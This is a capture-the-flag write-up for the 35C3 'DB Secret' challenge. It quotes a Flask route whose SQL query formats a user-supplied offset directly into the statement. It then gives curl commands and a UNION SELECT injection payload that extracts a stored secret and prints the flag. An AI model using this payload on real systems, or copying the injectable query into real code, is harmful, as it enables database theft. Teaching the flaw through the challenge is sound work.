# Challenge DB Secret

89 Points

## Challenge

To enable secure microservices (or whatever, we don't know yet) over Wee in the future, we created a specific DB_SECRET, only known to us. This token is super important and extremely secret, hence the name. The only way an attacker could get hold of it is to serve good booze to the admins. Pretty sure it's otherwise well protected on our secure server.

http://35.207.132.47/

Difficulty Estimate: Medium

Good coders should learn one new language every year.

InfoSec folks are even used to learn one new language for every new problem they face (YMMV).

If you have not picked up a new challenge in 2018, you're in for a treat.

We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.

Some cool Projects can be created in Wee, like: this, this and that.

Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.

Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).

We even added new features to this better server, like server-side Wee evaluation!

To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.


## Solution

In the init_db function of the server.py we see, that the token is saved into the database:

```
def init_db():
    with app.app_context():
        db = get_db()
        with open(MIGRATION_PATH, "r") as f:
            db.cursor().executescript(f.read())
        db.execute("CREATE TABLE `secrets`(`id` INTEGER PRIMARY KEY AUTOINCREMENT, `secret` varchar(255) NOT NULL)")
        db.execute("INSERT INTO secrets(secret) values(?)", (DB_SECRET,))
        db.commit()
```

So the secret token is saved into the database and we need to extract it. There is an interesting function, that not really escapes the given params:
```
@app.route("/api/getprojectsadmin", methods=["POST"])
def getprojectsadmin():
    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie("token"), request.sorting, request.dateOffset));
    name = request.cookies["name"]
    token = request.cookies["token"]
    user, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    offset = json["offset"]
    sorting = json["sorting"]

    if name != "admin":
        raise Exception("InvalidUserName")

    sortings = {
        "newest": "created DESC",
        "oldest": "created ASC",
        "lastmodified": "lastModified DESC"
    }
    sql_sorting = sortings[sorting]

    if not offset:
        offset = datetime.datetime.now()

    return jsonify_projects(query_db(
        "SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' "
        "ORDER BY {} LIMIT 10".format(offset, sql_sorting), one=False), username, "admin")
```

So if wwe can send a malicious offset, we can do an SQL injection! So first we need a valid admin login (done already with another challenge):

```
# create login token
root@blackbox:# curl -X POST -d '{"email":"admin"}' http://35.207.132.47/api/login
jossni

# verify login to generate cookie
root@blackbox:# curl -c cookies.txt -b cookies.txt -X POST -d '{"code":"jossni"}' http://35.207.132.47/api/verify
```

Now we can simply try to union select the secret value from the secrets table. A union select must always return the same number of columns as the first select. We can see in the code that the original select returns 8 columns, so we can simply append some static value columns to fix this.

So our offset value will be:
```
' UNION SELECT secret,1,1,1,1,1,1,1 FROM secrets --
```

Final request:
```
root@blackbox:# curl -c cookies.txt -b cookies.txt -X POST -d @payload.txt "http://35.207.132.47/api/getprojectsadmin"
[{"code":"35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???","content":1,"created":1,"lastModified":1,"public":1,"title":1,"type":1,"userName":1}]
```

And there we got our token 35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???
